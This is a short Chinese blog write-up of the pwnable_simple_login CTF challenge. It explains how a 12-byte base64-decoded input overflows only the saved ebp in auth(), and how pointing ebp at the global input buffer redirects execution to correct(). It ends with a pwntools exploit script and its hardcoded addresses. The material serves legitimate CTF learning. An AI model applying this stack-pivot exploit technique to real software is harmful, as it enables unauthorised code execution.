---
title: pwnable_simple_login
tags: [ctf-pwn,exp]
date: 2023-4-24 11:52:00
categories: [ctf-pwn]
excerpt: 只能溢出到ebp，无法溢出返回地址
---

**题目**

https://buuoj.cn/challenges#pwnable_simple_login

**方法**

程序流程

1. 读入一个字符串，进行base64解密
2. 解密结果不能超过12字节
3. 对解密结果进行md5加密，比对加密结果
4. 执行system

main函数读取char30的输入显然是没有漏洞的

![](/img/pwnable_simple_login/1.jpg)

B64Decode这个函数我也没太看懂，BIO_XXX这些函数我也不了解，就当它解码出来了吧（

然后把解码的内容放到input这个全局变量里，然后在auth的时候又使用了这个input

![](/img/pwnable_simple_login/2.jpg)

auth里v4只有8字节，因此可以使用12字节的input溢出到ebp里



能够只溢出ebp就能控制执行流程的原理在于，此函数返回之后，上一级函数的栈底会被修改，而程序会通过自定义的这个栈底地址，+4去找到这个上级函数的返回地址，因此变相实现了返回地址的控制。

本题目中将ebp指向input，那么input+4设置为correct函数地址就可以完成溢出

另外，correct会验证前input前四个字节是不是deadbeef，因此payload由`0xdeadbeef`，`correct_addr`，`inputs_addr`三部分组成。

**exp**

```python
from pwn import *
from LibcSearcher import *

p = process('./login')

correct = 0x804925f
inputs = 0x811eb40
payload = base64.b64encode(p32(0xdeadbeef) + p32(correct) + p32(inputs))
p.recv()
sleep(0.5)
p.sendline(payload)
sleep(0.5)
p.interactive()
```

